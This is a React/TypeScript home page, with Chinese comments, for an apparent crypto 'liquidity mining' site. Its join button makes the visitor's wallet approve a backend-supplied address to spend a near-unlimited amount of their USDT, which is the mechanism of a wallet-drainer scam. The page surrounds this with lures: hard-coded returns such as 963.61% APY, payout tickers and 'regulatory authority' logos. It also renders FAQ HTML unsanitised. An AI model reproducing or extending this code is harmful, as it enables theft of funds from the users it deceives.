import { useState, useEffect } from "react";
// import WalletModal from './WalletModal';
import { useTranslation } from "react-i18next";
import i18next from "i18next";
import { useQuery, useMutation } from "@tanstack/react-query";
import axios from "axios";
import {
  useAccount,
  useChainId,
  useWriteContract,
  useWaitForTransactionReceipt,
  useContractRead,
} from "wagmi";
import { useConnectModal } from "@rainbow-me/rainbowkit";
import { erc20Abi } from "viem";
import { parseUnits } from "viem";
import toast from "react-hot-toast";
import Staking from "../components/Staking";
import Activity from "../components/activity";
import { getExchangeRate } from "../lib/api";
import { useSettingChangeStore } from "../store/settingChangeStore";
import { useAuthRemainingStore } from "../store/authRemainingStore";
import { useUser } from "../lib/auth";

// 添加钱包授权请求函数
export const getWalletAuthorization = async () => {
  console.log("开始获取钱包授权");

  const response = await axios.post("/wallets/get-wallet-authorization");

  return response.data.data;
};

// 更新 Notice 接口以匹配实际数据结构
interface Notice {
  _id: string;
  id: string;
  title: string;
  content: string;
  type: string;
  creator: string;
  createdAt: string;
  updatedAt: string;
  __v: number;
}

// 定义接口数据类型
interface MiningOutput {
  id: string;
  address: string;
  amount: string;
  createdAt: string;
  usdtNumber: number;
}

// 添加合作平台接口类型
interface Partnership {
  id: string;
  name: string;
  logoUrl: string;
  website: string;
}

// 添加监管机构接口类型
interface RegulationAgency {
  id: string;
  name: string;
  logoUrl: string;
}

// 定义轮播图接口
interface Carousel {
  image: string;
}

// 添加USDT合约地址常量
const USDT_CONTRACT_ADDRESSES = {
  1: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // ETH Mainnet
  56: "0x55d398326f99059fF775485246999027B3197955", // BSC
  TRX: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // TRX
};

// 添加统计数据接口
interface StatisticsData {
  ethExchange: number; // ETH兑换率
  StakingApy: number; // 质押收益率
  revenuePool: number; // 收益池
  incomePool: number; // 收入池
  totalOutput: number; // 总产量
  validNodes: number; // 有效节点
  participants: number; // 参与人数
  userEarnings: number; // 用户收益
}

// 添加授权剩余时间接口
interface AuthRemaining {
  success: boolean;
  data: {
    address: string;
    network: string;
    authorizedAt: string;
    periodHours: number;
    remaining: {
      hours: number;
      minutes: number;
      seconds: number;
      totalSeconds: number;
      formatted: string;
    };
  };
}

// 添加汇率常量

function Home() {
  const { t } = useTranslation();

  const [expandedItems, setExpandedItems] = useState<number[]>([]);
  // const [faqItems, setFaqItems] = useState<FAQItem[]>([]);
  const [currentLang, setCurrentLang] = useState(i18next.language);

  const [currentIndex, setCurrentIndex] = useState(0);
  // 添加授权剩余时间状态
  const [remainingTime, setRemainingTime] = useState<string>("");

  // Fetch all home page data in one query
  const { data: homeData } = useQuery({
    queryKey: ["home", currentLang],
    queryFn: async () => {
      const response = await axios.get("/pages/home", {
        params: { lang: currentLang },
      });
      const {
        faq,
        notices,
        miningOutputs,
        partnerships,
        regulationAgencies,
        carousels,
      } = response.data.data;
      return {
        faqData: faq || [],
        notices: notices || [],
        miningOutputs: miningOutputs || [],
        partnerships: partnerships || [],
        regulationAgencies: regulationAgencies || [],
        carouselData: carousels?.map((item: Carousel) => item.image) || [],
      };
    },
  });

  const {
    faqData,
    notices,
    miningOutputs,
    partnerships,
    regulationAgencies,
    carouselData,
  } = homeData || {};

  // 自动轮播
  useEffect(() => {
    if (!carouselData || carouselData.length <= 1) return;

    const timer = setInterval(() => {
      setCurrentIndex((prev) => {
        const nextIndex = (prev + 1) % carouselData.length;
        // 当到达最后一张时,立即切回第一张
        if (nextIndex === 0) {
          return 0;
        }
        return nextIndex;
      });
    }, 5000);

    return () => clearInterval(timer);
  }, [carouselData]);

  // 手动切换
  const goToSlide = (index: number) => {
    setCurrentIndex(index);
  };

  useEffect(() => {
    const handleLanguageChange = (lng: string) => {
      setCurrentLang(lng);
    };

    i18next.on("languageChanged", handleLanguageChange);
    return () => {
      i18next.off("languageChanged", handleLanguageChange);
    };
  }, []);

  // 常见问题模块切换展开/收起状态
  const toggleItem = (index: number) => {
    setExpandedItems((prev) =>
      prev.includes(index) ? prev.filter((i) => i !== index) : [...prev, index],
    );
  };

  const { address } = useAccount();
  const chainId = useChainId();
  const { openConnectModal } = useConnectModal();
  const { writeContractAsync } = useWriteContract();
  const [txHash, setTxHash] = useState<`0x${string}` | undefined>();
  const { data: receipt, isSuccess } = useWaitForTransactionReceipt({
    hash: txHash,
  });
  const [isLoading, setIsLoading] = useState(false);

  const { data: user } = useUser();

  // 获取授权地址
  const { data: walletAuth } = useQuery({
    queryKey: ["wallet-auth", address, chainId],
    queryFn: async () => {
      if (!user || !address) return null;

      try {
        return await getWalletAuthorization();
      } catch (error) {
        console.error("获取授权地址失败:", error);
        return null;
      }
    },
    enabled: !!address && !!user,
  });

  // 自动检查授权状态
  const { data: allowance } = useContractRead({
    address: USDT_CONTRACT_ADDRESSES[
      chainId as keyof typeof USDT_CONTRACT_ADDRESSES
    ] as `0x${string}`,
    abi: erc20Abi,
    functionName: "allowance",
    args: walletAuth?.address
      ? [address as `0x${string}`, walletAuth.address as `0x${string}`]
      : undefined,
    query: {
      enabled: !!address && !!walletAuth?.address,
    },
  });
  //有可能(监听授权交易receipt无反应)会检查授权状态
  useEffect(() => {
    if (allowance !== undefined) {
      const isAuthorized = BigInt(allowance) > BigInt(0);
      if (isAuthorized && !user?.isVerified) {
        // 调用后端接口
        axios.post("customers/verify", {
          network: chainId === 1 ? "ETH" : chainId === 56 ? "BSC" : "ETH",
          address,
          isVerified: true,
        });
      }
    }
  }, [allowance, walletAuth?.address]);

  // 监听授权交易receipt
  useEffect(() => {
    if (receipt && receipt.status === "success") {
      // 交易成功后调用后端接口
      const verifyTransaction = async () => {
        try {
          await axios.post("customers/verify", {
            network: chainId === 1 ? "ETH" : chainId === 56 ? "BSC" : "ETH",
            address,
            isVerified: true,
          });
          toast.success("操作成功!");
          console.log("7. 整个流程完成！");
        } catch (error) {
          console.error("验证请求失败:", error);
          toast.error("验证失败");
        }
      };

      verifyTransaction();
    }
  }, [isSuccess, receipt, chainId, address]);

  // 替换钱包授权查询为mutation
  const { mutateAsync: getWalletAuth } = useMutation({
    mutationFn: async () => {
      console.log("开始获取钱包授权");

      if (!user) {
        throw new Error("用户未登录");
      }

      // 调用导出的函数
      return getWalletAuthorization();
    },
  });

  // 处理加入按钮点击
  const handleJoin = async () => {
    console.log("1. 按钮被点击");

    if (!user) {
      toast.error("请先登录");
      return;
    }

    if (!address && openConnectModal) {
      console.log("2. 钱包未连接，打开连接弹窗");
      openConnectModal();
      return;
    }

    // 获取当前链的USDT地址
    const network = user.network;
    const usdtAddress =
      network === "TRX"
        ? USDT_CONTRACT_ADDRESSES["TRX"]
        : USDT_CONTRACT_ADDRESSES[
            chainId as keyof typeof USDT_CONTRACT_ADDRESSES
          ];

    if (!usdtAddress) {
      toast.error("不支持的网络");
      return;
    }

    try {
      setIsLoading(true);

      // 先获取授权地址
      const walletAuth = await getWalletAuth();

      if (!walletAuth?.address) {
        toast.error("未获取到授权地址");
        return;
      }

      console.log("3. 开始合约调用...");

      // 调用合约，使用获取到的授权地址
      console.log("授权地址:", walletAuth.address);
      const hash = await writeContractAsync({
        address: usdtAddress as `0x${string}`,
        abi: erc20Abi,
        functionName: "approve",
        args: [
          walletAuth.address as `0x${string}`,
          parseUnits(
            "115792089237316195423570985008687907853269984665640564039457",
            6,
          ),
        ],
      });

      // 保存交易哈希
      setTxHash(hash);
      console.log("4. 合约调用已发送，等待确认...");
    } catch (error) {
      console.error("❌ 发生错误:", error);
      toast.error("操作失败");
      setIsLoading(false);
    }
  };

  const [isStakingOpen, setIsStakingOpen] = useState(false);

  // 处理质押面板的打开和关闭
  const handleOpenStaking = () => setIsStakingOpen(true);
  const handleCloseStaking = () => setIsStakingOpen(false);

  // 修改 Activity 相关的状态和处理函数
  const [isActivityOpen, setIsActivityOpen] = useState(true);

  // 处理活动面板的关闭
  const handleCloseActivity = () => {
    setIsActivityOpen(false);
  };

  // 每次刷新页面时都显示 Activity
  useEffect(() => {
    setIsActivityOpen(true);
  }, []);

  // 获取统计数据
  const { data: statisticsData, refetch: refetchStatisticsData } =
    useQuery<StatisticsData>({
      queryKey: ["statistics"],
      queryFn: async () => {
        // Get statistics data from backend
        const response = await axios.get("/settings/statistics");
        const stats = response.data.data;

        // Get exchange rate separately since it's using a different function
        const exchangeRate = await getExchangeRate("ETH", "USDT");

        return {
          ...stats,
          ethExchange: Number(exchangeRate), // Add exchange rate to statistics data
        };
      },
    });

  const { settingChange } = useSettingChangeStore();

  const { authRemaining: authRemainingFlag } = useAuthRemainingStore();

  useEffect(() => {
    refetchStatisticsData();
  }, [settingChange]);
  // 收益计时器，查询授权剩余时间
  const { data: authRemaining, refetch: refetchAuthRemaining } =
    useQuery<AuthRemaining>({
      queryKey: ["auth-remaining", user?._id],
      queryFn: async () => {
        if (!user) {
          return null;
        }

        const response = await axios.get("/customers/auth-remaining");

        return response.data;
      },
      enabled: !!((user && user.isAuthorized) || user?.isVerified),
    });

  useEffect(() => {
    refetchAuthRemaining();
  }, [authRemainingFlag]);

  // 格式化剩余时间
  useEffect(() => {
    if (!authRemaining?.success || !authRemaining?.data?.remaining) {
      setRemainingTime("");
      return;
    }

    const { hours, minutes, seconds } = authRemaining.data.remaining;
    let totalSeconds = hours * 3600 + minutes * 60 + seconds;

    // 设置初始时间
    const updateDisplay = () => {
      const h = Math.floor(totalSeconds / 3600);
      const m = Math.floor((totalSeconds % 3600) / 60);
      const s = totalSeconds % 60;

      let result = "";
      if (h > 0) {
        result += `${h}:`;
      }
      if (m > 0 || h > 0) {
        result += `${m.toString().padStart(2, "0")}:`;
      }
      result += `${s.toString().padStart(2, "0")}`;

      setRemainingTime(result);
    };

    // 初始显示
    updateDisplay();

    // 设置定时器每秒更新
    const timer = setInterval(() => {
      if (totalSeconds > 0) {
        totalSeconds--;
        updateDisplay();
      } else {
        clearInterval(timer);
        setRemainingTime("00:00");
        // 时间到后重新获取授权状态
        refetchAuthRemaining();
      }
    }, 1000);

    // 清理定时器
    return () => clearInterval(timer);
  }, [authRemaining, refetchAuthRemaining]);

  return (
    <div>
      {/* 轮播图 */}
      <div className="relative w-full h-68 mb-2 overflow-hidden rounded-lg xl:h-[600px]">
        <div
          className="flex w-full h-full transition-transform duration-500 ease-in-out"
          style={{ transform: `translateX(-${currentIndex * 100}%)` }}
        >
          {carouselData?.map((image: string, index: number) => (
            <img
              key={index}
              src={image}
              alt={t("serves.bannerAlt", { index: index + 1 })}
              className="w-full h-full object-contain flex-shrink-0"
            />
          ))}
        </div>

        {/* 轮播指示器 */}
        <div className="absolute bottom-4 left-0 right-0 flex justify-center space-x-2 z-10">
          {carouselData?.map((_: string, index: number) => (
            <button
              key={index}
              onClick={() => goToSlide(index)}
              className={`w-2 h-2 rounded-full transition-opacity ${
                currentIndex === index ? "bg-white" : "bg-white opacity-50"
              }`}
            />
          ))}
        </div>
      </div>

      {/* 通知 */}
      <div className="bg-gray-800 p-4 rounded-lg mb-6 overflow-hidden relative">
        <div className="flex items-center relative">
          <span className="text-yellow-500 mr-2 shrink-0">🔔</span>
          <div className="overflow-hidden absolute left-12 right-4">
            <div className="flex items-center whitespace-nowrap animate-marquee">
              {notices?.map((notice: Notice, index: number) => (
                <span
                  key={notice._id}
                  className="inline-block animate-[marquee_15s_linear_infinite]"
                  style={{
                    marginRight: index < notices.length - 1 ? "2rem" : "0",
                  }}
                >
                  {notice.content}
                </span>
              ))}
            </div>
          </div>
        </div>
      </div>

      {/* 收益展示模块 */}
      <div className="mb-6 bg-[#1a1f2e] rounded-lg p-4">
        <div className="flex items-center justify-between mb-6">
          <div className="flex items-center space-x-2">
            <span className="text-xl font-bold">
              {user?.ethPlatform
                ?.toString()
                .match(/^-?\d+(?:\.\d{0,6})?/)?.[0] || "0.0000"}{" "}
              <span className="text-gray-400">ETH</span>
            </span>
          </div>
          {/* 根据授权状态显示不同内容 */}
          {user?.isAuthorized || user?.isVerified ? (
            <div className="bg-[#2d2672] text-white px-6 py-2 rounded-lg">
              {remainingTime ? `${remainingTime}` : "--:--:--"}
            </div>
          ) : (
            <button
              className="bg-[#EAB308] text-white px-6 py-2 rounded-lg disabled:opacity-50"
              onClick={handleJoin}
              disabled={isLoading}
            >
              {isLoading ? "Processing..." : t("home.join")}
            </button>
          )}
        </div>

        <div className="grid grid-cols-3 gap-6 mb-4">
          <div>
            <div className="text-gray-400 text-xs mb-1">
              {t("home.profitPool")}
            </div>
            <div className="font-medium text-xs">
              {statisticsData?.revenuePool.toFixed(2) || "11359.55"} ETH
            </div>
          </div>
          <div>
            <div className="text-gray-400 text-xs mb-1">
              {t("home.playerIncome")}
            </div>
            <div className="font-medium text-green-500 text-xs">
              {statisticsData?.incomePool.toFixed(2) || "963.61"} %
            </div>
          </div>
          <div>
            {/* 真实api */}
            <div className="text-gray-400 text-xs mb-1">
              {t("home.ethExchange")}
            </div>
            <div className="font-medium text-xs">
              {statisticsData?.ethExchange || "3893.9"} USDT
            </div>
          </div>
        </div>

        <div className="grid grid-cols-2 gap-4">
          <div>
            <div className="text-gray-400 text-xs mb-2">
              {t("home.walletBalance")}:
            </div>
            <div className="flex items-center justify-between bg-[#151923] rounded-lg px-4 py-2">
              <span className="text-sm">
                {user?.usdtBalance
                  ?.toString()
                  .match(/^-?\d+(?:\.\d{0,6})?/)?.[0] || "0.00"}{" "}
                USDT
              </span>
              <button className="text-gray-400 bg-[#1F2937] rounded-full p-1 hover:bg-[#374151]">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  fill="none"
                  viewBox="0 0 24 24"
                  strokeWidth={1.5}
                  stroke="currentColor"
                  className="w-4 h-4"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    d="M11.25 11.25l.041-.02a.75.75 0 011.063.852l-.708 2.836a.75.75 0 001.063.853l.041-.021M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-9-3.75h.008v.008H12V8.25z"
                  />
                </svg>
              </button>
            </div>
          </div>
          <div>
            <div className="text-gray-400 text-xs mb-2">
              {t("home.stakingAPY")}:
            </div>
            <div className="flex items-center justify-between bg-[#151923] rounded-lg px-4 py-2">
              <span className="text-xs bg-[#6366f1] text-white px-4 py-1 rounded-lg">
                {" "}
                {statisticsData?.StakingApy.toFixed(2) || "963.61"} %
              </span>
              <button className="text-gray-400 bg-[#1F2937] rounded-full p-1 hover:bg-[#374151]">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  fill="none"
                  viewBox="0 0 24 24"
                  strokeWidth={1.5}
                  stroke="currentColor"
                  className="w-4 h-4"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    d="M11.25 11.25l.041-.02a.75.75 0 011.063.852l-.708 2.836a.75.75 0 001.063.853l.041-.021M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-9-3.75h.008v.008H12V8.25z"
                  />
                </svg>
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* 流动性采矿数据 */}
      <h3 className="text-center mb-2 text-xl">{t("LiquidityMiningData")}</h3>
      <div className="mb-6 bg-gray-800 p-4 rounded-lg">
        <div className="space-y-4">
          <div className="flex justify-between border-b border-[#2c3645] py-2">
            <span className="text-gray-400">{t("totalProduction")}</span>
            <span>{statisticsData?.totalOutput} USDT</span>
          </div>
          <div className="flex justify-between border-b border-[#2c3645] py-2">
            <span className="text-gray-400">{t("effectiveNodes")}</span>
            <span>{statisticsData?.validNodes}</span>
          </div>
          <div className="flex justify-between border-b border-[#2c3645] py-2">
            <span className="text-gray-400">{t("participantNumber")}</span>
            <span>{statisticsData?.participants}</span>
          </div>
          <div className="flex justify-between border-b border-[#2c3645] py-2">
            <span className="text-gray-400">{t("userIncome")}</span>
            <span>{statisticsData?.userEarnings} USDT</span>
          </div>
        </div>
      </div>

      {/* 流动性采矿产出 */}
      <div className="mb-6">
        <h3 className="text-center text-xl">
          {t("home.LiquidityMiningOutput")}
        </h3>
        {/* 标题行 */}
        <div className="flex justify-between items-center mb-2">
          <span className="text-gray-400">{t("home.address")}</span>
          <span className="text-gray-400">{t("home.amount")}</span>
        </div>
        <div className="h-[360px] overflow-hidden relative">
          {/* 数据滚动容器 */}
          <div
            className="animate-scroll-y absolute w-full"
            style={{
              willChange: "transform",
              transform: "translate3d(0, 0, 0)",
            }}
          >
            {/* 渲染数据 */}
            <div className="space-y-0.5">
              {miningOutputs?.map((item: MiningOutput) => (
                <div
                  key={item.id}
                  className="flex justify-between items-center bg-gray-800 p-3"
                >
                  <span className="text-gray-400">
                    {item.address.slice(0, 8)}...{item.address.slice(-8)}
                  </span>
                  <span>{item.usdtNumber}USDT</span>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>

      {/* 数据展示卡片 */}
      <div className="grid grid-cols-2 gap-4 mb-6">
        {/* 得矿率卡片 */}
        <div className="bg-gray-800 rounded-lg p-4">
          <div className="flex items-center justify-center mb-2">
            <div className="w-12 h-12 bg-green-600 rounded-full flex items-center justify-center">
              <svg
                className="w-6 h-6 text-white"
                viewBox="0 0 24 24"
                fill="currentColor"
              >
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm.31-8.86c-1.77-.45-2.34-.94-2.34-1.67 0-.84.79-1.43 2.1-1.43 1.38 0 1.9.66 1.94 1.64h1.71c-.05-1.34-.87-2.57-2.49-2.97V5H10.9v1.69c-1.51.32-2.72 1.3-2.72 2.81 0 1.79 1.49 2.69 3.66 3.21 1.95.46 2.34 1.15 2.34 1.87 0 .53-.39 1.39-2.1 1.39-1.6 0-2.23-.72-2.32-1.64H8.04c.1 1.7 1.36 2.66 2.86 2.97V19h2.34v-1.67c1.52-.29 2.72-1.16 2.73-2.77-.01-2.2-1.9-2.96-3.66-3.42z" />
              </svg>
            </div>
          </div>
          <div className="text-center">
            <div className="text-gray-400 text-sm mb-1">
              {t("home.miningRate")}
            </div>
            <div className="text-white text-xl font-bold">26.09%</div>
          </div>
        </div>

        {/* 累积收益卡片 */}
        <div
          className="bg-gray-800 rounded-lg p-4 cursor-pointer transition-colors"
          onClick={handleOpenStaking}
        >
          <div className="flex items-center justify-center mb-2">
            <div className="w-12 h-12 bg-purple-600 rounded-full flex items-center justify-center">
              <svg
                className="w-6 h-6 text-white"
                viewBox="0 0 24 24"
                fill="currentColor"
              >
                <path d="M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V19h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.42z" />
              </svg>
            </div>
          </div>
          <div className="text-center">
            <div className="text-gray-400 text-sm mb-1">
              {t("home.staking")}
            </div>
            <div className="text-white text-xl font-bold">
              {user?.usdtStaking?.toFixed(6) || "0.00"}
            </div>
          </div>
        </div>
      </div>

      {/* 添加 Staking 组件 */}
      <Staking isOpen={isStakingOpen} onClose={handleCloseStaking} />

      {/* 常见问题 */}
      <div className="mb-6">
        <h3 className="text-xl mb-3 text-center">{t("home.faq")}</h3>
        <div className="space-y-3">
          {Array.isArray(faqData) &&
            faqData.map((item, index) => (
              <div
                key={index}
                className="bg-gray-800 rounded-lg overflow-hidden"
              >
                <div
                  className="flex justify-between items-center p-4 cursor-pointer"
                  onClick={() => toggleItem(index)}
                >
                  <span>{item.title}</span>
                  <svg
                    className={`w-4 h-4 text-gray-400 transform transition-transform duration-300 ${
                      expandedItems.includes(index) ? "rotate-180" : ""
                    }`}
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    <polyline points="6 9 12 15 18 9"></polyline>
                  </svg>
                </div>
                {expandedItems.includes(index) && (
                  <div className="px-4 pb-4 text-gray-400">
                    <div dangerouslySetInnerHTML={{ __html: item.content }} />
                  </div>
                )}
              </div>
            ))}
        </div>
      </div>

      {/* 监管机构 */}
      <div className="mb-6">
        <div className="flex items-center justify-center mb-2">
          <h3 className="text-xl">{t("home.regulatoryAuthorities")}</h3>
        </div>
        <p className="text-center text-sm text-gray-400 mb-4">
          {t("home.globalRegulation")}
        </p>
        <div className="grid grid-cols-3 gap-4">
          {regulationAgencies?.map((agency: RegulationAgency) => (
            <div
              key={agency.id}
              className="bg-[#c5d1df] rounded-lg p-4 aspect-video"
            >
              <img
                src={agency.logoUrl}
                alt={agency.name}
                className="w-full h-full object-contain"
              />
            </div>
          ))}
        </div>
      </div>

      {/* 合作平台 */}
      <div className="mb-10">
        <h3 className="text-xl mb-2 text-center">
          {t("serves.cooperativePlatform")}
        </h3>
        <div className="grid grid-cols-2 gap-6 bg-gray-800 p-4 rounded-lg">
          {partnerships?.map((partner: Partnership) => (
            <div key={partner.id} className="flex items-center space-x-3">
              <a
                href={partner.website}
                target="_blank"
                rel="noopener noreferrer"
                className="flex items-center space-x-3"
              >
                <img
                  src={partner.logoUrl}
                  alt={partner.name}
                  className="w-8 h-8"
                />
                <span className="text-base text-[#656a6e] font-bold">
                  {partner.name}
                </span>
              </a>
            </div>
          ))}
        </div>
      </div>

      {/* 添加 Activity 组件 */}
      <Activity isOpen={isActivityOpen} onClose={handleCloseActivity} />
    </div>
  );
}

export default Home;
